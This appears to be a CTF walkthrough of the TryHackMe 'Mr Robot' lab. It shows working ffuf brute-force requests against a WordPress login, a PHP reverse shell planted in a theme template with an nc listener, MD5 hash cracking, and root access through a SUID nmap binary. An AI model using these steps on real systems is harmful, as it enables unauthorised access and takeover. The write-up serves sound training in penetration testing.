---
title: Mr Robot CTF Writeup || Tryhackme
date: 2025-3-5 00:00:00 +0800
categories: [Tryhackme, Offensive Pentesting Path]
tags: [tryhackme, writeup, walkthrough, web, fuzzing, linux]     # TAG names should always be lowercase
description: This is a Writeup for Mr Robot CTF Room Which is a part of the offensive pentesting path on Tryhackme
---

### Scanning

Starting with scanning our target 

```
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 28:7c:6a:99:61:cb:2f:23:07:3f:83:a0:d0:77:ba:eb (RSA)
|   256 b9:ed:e8:b4:e9:aa:78:cb:4b:86:28:46:64:85:1a:bc (ECDSA)
|_  256 a4:8b:32:9d:42:30:72:06:ca:6a:a7:9f:9e:0a:37:d4 (ED25519)
80/tcp open  http    WebSockify Python/3.8.10
```

We will see that there is http port on our target so let's see it

### Website Discovery

After opening the website you will find something to enter commands on it like a linux shell 

![img-description](/assets/img/MrRobot/Websites.png)
_Website_

i tried all these commands but i couldn't find something important, so as a basic step let's try some directory fuzzing.

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://10.10.208.13/FUZZ' -r
```

![img-description](/assets/img/MrRobot/Fuzzing.png)
_Fuzzing_

We can see that it seems like it is a wordpress site and i have verified that through accessing the wp-login page so i will try deafault credentials may be we can get access to the admin panel.

![img-description](/assets/img/MrRobot/Wp-login.png)
_login_

it seems the site have a major problem as i have entered the username admin and the same as a password and it seems that it tells us if this is a valid username or not so let's keep that in mind.

as we didn't get access from the default credentials we can see that in the fuzzed directories robots dir which means the **robots.txt** file so let's see it's contents

### Key 1

**robots.txt**: is a text file created by the designer to prevent the search engines and bots to crawl up their sites. It contains the list of allowed and disallowed sites and whenever a bot wants to access the website, it checks the robots.txt file and accesses only those sites that are allowed. It doesn’t show up the disallowed sites in search results.

![img-description](/assets/img/MrRobot/robots.png)
_robots.txt_

it seems that it have two files the first one which is our first key

```
073403c8a58a1f80d94345**********
```

and the second file i have downloaded and it seems like a wordlist but it have too many lines.
I wanted to see it's contents if it is some type of a users list or a directory list, so i have used this command the **-i** command for making the results case insensitive

![img-description](/assets/img/MrRobot/grep.png)
_List_

we can see that the file have some words that are the same many times so this is unnecessary so let's make this file smaller so that we can take some lower time while bruteforcing.

```
sort -u yourfile.dit -o yourfile.dit
```

this will print us all the words without repeating them and sort them also.

#### Bruteforcing credentials

as we have verefied that it seems like it is some kind of a usernames list so we will try to fuzz the wordpress login with this list.

open burpsuite and intercept the request and then save it in a file and in the username field type the word **FUZZ** like this

```
POST /wp-login.php HTTP/1.1
Host: 10.10.208.13
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://10.10.208.13
Connection: close
Referer: http://10.10.208.13/wp-login.php
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=FUZZ&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.208.13%2Fwp-admin%2F&testcookie=1
```

then using **ffuf** again let's bruteforce it

```
ffuf -request request.txt -w cleaned.dic -fs 3540
```

the -fs will filter the response size so we can get the right username.

![img-description](/assets/img/MrRobot/Bruteforcingusernames.png)
_Bruteforcing Username_

so we have a valid username now, we can also try bruteforcing the password for this username.

using **ffuf** again but now change the **FUZZ** word to be in the password field this time and the username field is elliot like this.

```
POST /wp-login.php HTTP/1.1
Host: 10.10.208.13
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://10.10.208.13
Connection: close
Referer: http://10.10.208.13/wp-login.php
Cookie: wordpress_test_cookie=WP+Cookie+check
Upgrade-Insecure-Requests: 1

log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.208.13%2Fwp-admin%2F&testcookie=1
```

now filter this size

```
ffuf -request request.txt -w cleaned.dic -fs 3591
```

![img-description](/assets/img/MrRobot/Bruteforcingpasswords.png)
_Bruteforcing Password_

and again we got a hit and now we have access to the admin panel

### Gaining Access

as we now have access on the admin panel we can easily gain access to the server you can search for how to get a reverse shell from wp admin panel and you will see the steps of it, so let's see how can we do this.

follow the steps in the following image after you enter the creds that we have found from the bruteforcing.

![img-description](/assets/img/MrRobot/Shell.png)
_Reverse Shell_

let's explain what we are doing, we are now trying to access the 404 page and we can see that it is a php code so we need to find a php reverse shell we will find this on [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) we now will need to change the php code of the page with the reverse shell php code **after changing our ip and port that we need to recieve the reverse shell back on it**, and open a nc listener with the port you have entered in the code and wait for the connection

```
nc -nlvp 4444
```

after doing this if we now go to the browser and searched for the 404.php page in the server like this 

```
http://10.10.208.13/404.php
```

we will execute the shell and we will see that we have access on the server now.

![img-description](/assets/img/MrRobot/UserAccess.png)
_User Access_

#### Key 2

Let's stabilize the shell now and get our second key

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

then go to the home directory we will find a user with the name robot which have two interesting files we can't access the second key but we can access the other file.

```
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

as we can see from it's name it is an md5 hashed password so go to [crackstation](https://crackstation.net) and try to get the real password.

![img-description](/assets/img/MrRobot/Password.png)
_robot password_

now let's access the other user to get the second key

```
su robot
```

and enter the password we have found and here is our second key

```
822c73956184f694993bed**********
```

### Privilege Escalation

We now want to gain root access so i will try and see the files with the **SUID** bit set, the suid bit allow files to be executed with the permission level of the file owner or the group owner.

![img-description](/assets/img/MrRobot/SUID.png)
_SUID_

We can see that nmap is present in the list so let's search for how can we exploit this, upon seraching i have found that Nmap versions before 7.70 included an interactive mode that allowed users to execute system commands using ! (exclamation mark). Since our nmap binary has the SUID bit set, this means when we execute it, it runs as root. If the interactive mode is present, it can be used to escalate privileges by spawning a root shell.

so let's see the nmap version on our system.

```
robot@linux:/home$ nmap --version                                                            
nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

we can see that this version have this vulnerability so let's exploit it, enter interactive mode command and after it opens enter this command  
**!sh** so that we can execute a root shell.

```
robot@linux:/home$ nmap --interactive                                                                 
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )      
Welcome to Interactive Mode -- press h <enter> for help      
nmap> !sh                                                                                                            
# whoami
root
```
we can see that we have root shell right now

#### Key 3

By accessing the root directory we will find our last key.

```
04787ddef27c3dee1ee161**********
```